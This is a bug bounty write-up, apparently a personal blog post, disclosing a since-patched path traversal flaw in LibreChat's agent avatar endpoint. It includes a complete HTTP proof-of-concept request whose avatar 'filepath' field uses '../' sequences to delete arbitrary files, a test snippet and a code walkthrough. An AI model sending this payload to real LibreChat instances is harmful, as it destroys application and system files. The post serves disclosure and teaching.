---
layout: post
title: (Duplicate) Path Traversal that leads to remove other files with node permission in danny-avila/librechat
description: BugBounty Write-up
tags: huntr bugbounty path-traversal      
category: bugbounty 
---   
      
I reported path traversal vulnerability in <a href="https://github.com/danny-avila/LibreChat">danny-avila/librechat</a> to the huntr bugbounty platform. I didn't receive any response from the manager for 6 days. I forwarded my report to the project manager and wanted them to patch this vulnerability, so I directly sent the email to the project manager. 
       
<img src="/assets/images/bugbounty/huntr/librechat/valid.png" width=700px>          
        
The project manager accepted my report that there was a vulnerability in the project. The maintainer has patched the project's source code.   
     
<img src="/assets/images/bugbounty/huntr/librechat/duplicate.png" width=700px>    
      
However, I unfortunately received a duplicate notification from huntr a day later. I was so embarrassed and empty when I heard the notification. Although I received duplicate notification, I thought it would be helpful in the future to document the vulnerability discovery process. Before going into detail, the contents of my report are as follows. 
  
# 📜 Description     
    
A path traversal attack (also known as directory traversal) is a security vulnerability that allows attackers to manipulate file or directory paths in order to access unintended files or directories outside the intended folder structure. When a web application provides insufficient validation or sanitization of user inputs, attackers can exploit this weakness by crafting requests that traverse directories to access sensitive system files or perform unauthorized actions like deleting files.  
         
# 🕵️ Proof of Concept    

I created the file in /app/test/hacked for testing if the file removes or not. The file had the permission of node.     
     
```http
POST /api/agents/avatar/asdf HTTP/1.1
Host: localhost:3080
Content-Length: 10352
sec-ch-ua-platform: "Windows"
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MGZhNWE1YTcyY2QwNjZmMzQxYjcwZCIsInVzZXJuYW1lIjoiYWFhYWEiLCJwcm92aWRlciI6ImxvY2FsIiwiZW1haWwiOiJhYWFhYUBuYXZlci5jb20iLCJpYXQiOjE3MjkxMzgzNzcsImV4cCI6MTcyOTEzOTI3N30.Drs4845G6BvwlTsbPmIU97COOEpUYnb1QPNDxczl77c
Accept-Language: ko-KR,ko;q=0.9
sec-ch-ua: "Chromium";v="129", "Not=A?Brand";v="8"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqD8OKhALyMzAPlIU
Origin: http://localhost:3080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:3080/c/new
Accept-Encoding: gzip, deflate, br
Cookie: refreshToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3MGZhNWE1YTcyY2QwNjZmMzQxYjcwZCIsImlhdCI6MTcyOTEzODM3NywiZXhwIjoxNzI5Njk4NjI0fQ.QnMNZfYNdC-kKdfjxeOWihbiF053uWNiPPsnWJU75m0
Connection: keep-alive

------WebKitFormBoundaryqD8OKhALyMzAPlIU
Content-Disposition: form-data; name="file"; filename="avatar.png"
Content-Type: image/png

PNG Binary
------WebKitFormBoundaryqD8OKhALyMzAPlIU
Content-Disposition: form-data; name="avatar"

{
    "source":"local",
    "filepath":"/uploads/670fa5a5a72cd066f341b70d/../../../../../../../../app/test/hacked"
}
------WebKitFormBoundaryqD8OKhALyMzAPlIU--
```     
     
This problem occurs in /api/server/services/Files/Local/crud.js. It's because there is no verification logic for the path.    
    
```javascript
if (file.filepath.startsWith(`/uploads/${req.user.id}`)) {
    const basePath = file.filepath.split('/uploads/')[1];
    const filepath = path.join(uploads, basePath);
    await fs.promises.unlink(filepath);
    return;
}
```    
          
## Test Code    
     
```javascript
const path = require('path');

const basePath = "/uploads/670fa5a5a72cd066f341b70d/../../../../../../../../app/test/hacked".split("/uploads/")[1];
console.log(basePath);
console.log(path.join("/uploads/", basePath)); // OUTPUT: /app/test/hacked
```

# 🔐 Mitigations    
     
you can use the regex function to extract the last element of path or check the path if the dot includes in path.          
     
# 📚 References      
- [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) 
- [PortSwigger - Path Traversal](https://portswigger.net/web-security/file-path-traversal)     
      
# Impact
An attacker could perform actions not intended by application like delete arbitrary files on file system including application source code or configuration and critical system files.         
      
# Write-up    
    
- /api/server/index.js    
    
```javascript
app.use('/api/agents', routes.agents);
```      
    
- /api/server/routes/agents/v1.js

```javascript
... 
/**
 * Uploads and updates an avatar for a specific agent.
 * @route POST /avatar/:agent_id
 * @param {string} req.params.agent_id - The ID of the agent.
 * @param {Express.Multer.File} req.file - The avatar image file.
 * @param {string} [req.body.metadata] - Optional metadata for the agent's avatar.
 * @returns {Object} 200 - success response - application/json
 */
router.post('/avatar/:agent_id', checkAgentAccess, upload.single('file'), v1.uploadAgentAvatar);

module.exports = router;
```         
          
We can upload a single file in `/api/agents/avatar/:agent_id` path. A router maps the path into `v1.uploadAgentAvatar` method.      

- /api/server/controllers/agents/v1.js         
        
```javascript
...

/**
 * Uploads and updates an avatar for a specific agent.
 * @route POST /avatar/:agent_id
 * @param {object} req - Express Request
 * @param {object} req.params - Request params
 * @param {string} req.params.agent_id - The ID of the agent.
 * @param {Express.Multer.File} req.file - The avatar image file.
 * @param {object} req.body - Request body
 * @param {string} [req.body.avatar] - Optional avatar for the agent's avatar.
 * @returns {Object} 200 - success response - application/json
 */
const uploadAgentAvatarHandler = async (req, res) => {
  try {
    const { agent_id } = req.params;
    if (!agent_id) {
      return res.status(400).json({ message: 'Agent ID is required' });
    }

    const image = await uploadImageBuffer({
      req,
      context: FileContext.avatar,
      metadata: {
        buffer: req.file.buffer,
      },
    });

    let _avatar;
    try {
      const agent = await getAgent({ id: agent_id });
      _avatar = agent.avatar;
    } catch (error) {
      logger.error('[/avatar/:agent_id] Error fetching agent', error);
      _avatar = {};
    }

    if (_avatar && _avatar.source) {
      const { deleteFile } = getStrategyFunctions(_avatar.source);
      try {
        await deleteFile(req, { filepath: _avatar.filepath });
        await deleteFileByFilter({ user: req.user.id, filepath: _avatar.filepath });
      } catch (error) {
        logger.error('[/avatar/:agent_id] Error deleting old avatar', error);
      }
    }

    ...
  } catch (error) {
    const message = 'An error occurred while updating the Agent Avatar';
    logger.error(message, error);
    res.status(500).json({ message });
  }
};

module.exports = {
  createAgent: createAgentHandler,
  getAgent: getAgentHandler,
  updateAgent: updateAgentHandler,
  deleteAgent: deleteAgentHandler,
  getListAgents: getListAgentsHandler,
  uploadAgentAvatar: uploadAgentAvatarHandler,
};
```     
      
`uploadAgentAvatar` method is mapped to `uploadAgentAvatarHandler`. There is a function named `deleteFile` in the `uploadAgentAvatarHandler` method. The `deleteFile` function is decided by the parameter named `_avatar.source` , so we should see the `getStrategyFunctions` function.
    
- /api/server/services/Files/strategies.js

```javascript
// Strategy Selector
const getStrategyFunctions = (fileSource) => {
  if (fileSource === FileSources.firebase) {
    return firebaseStrategy();
  } else if (fileSource === FileSources.local) {
    return localStrategy();
  } else if (fileSource === FileSources.openai) {
    return openAIStrategy();
  } else if (fileSource === FileSources.azure) {
    return openAIStrategy();
  } else if (fileSource === FileSources.vectordb) {
    return vectorStrategy();
  } else if (fileSource === FileSources.execute_code) {
    return codeOutputStrategy();
  } else {
    throw new Error('Invalid file source');
  }
};
...

/**
 * Local Server Storage Strategy Functions
 *
 * */
const localStrategy = () => ({
  /** @type {typeof uploadVectors | null} */
  handleFileUpload: null,
  saveURL: saveFileFromURL,
  getFileURL: getLocalFileURL,
  saveBuffer: saveLocalBuffer,
  deleteFile: deleteLocalFile,
  processAvatar: processLocalAvatar,
  handleImageUpload: uploadLocalImage,
  prepareImagePayload: prepareImagesLocal,
  getDownloadStream: getLocalFileStream,
});
```        
    
If `_avatar.source` value is 'local', we can call `deleteLocalFile` function in `localStrategy`. The `_avatar.source` value can be decided by user as follows.    

```http
------WebKitFormBoundaryqD8OKhALyMzAPlIU
Content-Disposition: form-data; name="avatar"

{
    "source":"local",
}
```         
    
- /api/server/services/Files/Local/crud.js
        
```javascript
const deleteLocalFile = async (req, file) => {
  const { publicPath, uploads } = req.app.locals.paths;
  if (file.embedded && process.env.RAG_API_URL) {
    const jwtToken = req.headers.authorization.split(' ')[1];
    axios.delete(`${process.env.RAG_API_URL}/documents`, {
      headers: {
        Authorization: `Bearer ${jwtToken}`,
        'Content-Type': 'application/json',
        accept: 'application/json',
      },
      data: [file.file_id],
    });
  }

  if (file.filepath.startsWith(`/uploads/${req.user.id}`)) {
    const basePath = file.filepath.split('/uploads/')[1];
    const filepath = path.join(uploads, basePath);

    await fs.promises.unlink(filepath);
    return;
  }

  const parts = file.filepath.split(path.sep);
  const subfolder = parts[1];
  const filepath = path.join(publicPath, file.filepath);

  if (!isValidPath(req, publicPath, subfolder, filepath)) {
    throw new Error('Invalid file path');
  }

  await fs.promises.unlink(filepath);
};
```        
     
The vulnerability is occurred by the ```if(file.filepath.startsWith(`/uploads/${req.user.id}`))``` condition. If the user enters a `file.filepath` to `/uploads/xxxx/../../../../../../../app/test/hacked`, the value of variable named `filepath` is `/app/test/hacked`. Thus, we can get a path traversal vulnerability in this project. Done.       